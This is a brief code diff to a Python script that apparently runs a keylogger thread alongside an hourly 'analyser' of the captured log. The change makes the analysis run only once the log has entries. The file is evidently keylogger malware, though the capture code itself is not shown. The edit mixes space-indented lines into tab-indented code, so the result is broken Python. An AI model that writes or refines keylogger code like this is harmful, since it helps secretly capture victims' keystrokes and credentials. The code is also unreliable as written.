@@ -86,7 +86,10 @@ def analyser_every_hour():
 	while True:
 		global log
 		time.sleep(3600)
-		analyser()
+        if (len(log) > 1):
+            analyser()
+        else:
+            time.sleep(3600)
 
 t1 = threading.Thread(target=keylogger)
 t2 = threading.Thread(target=analyser_every_hour)
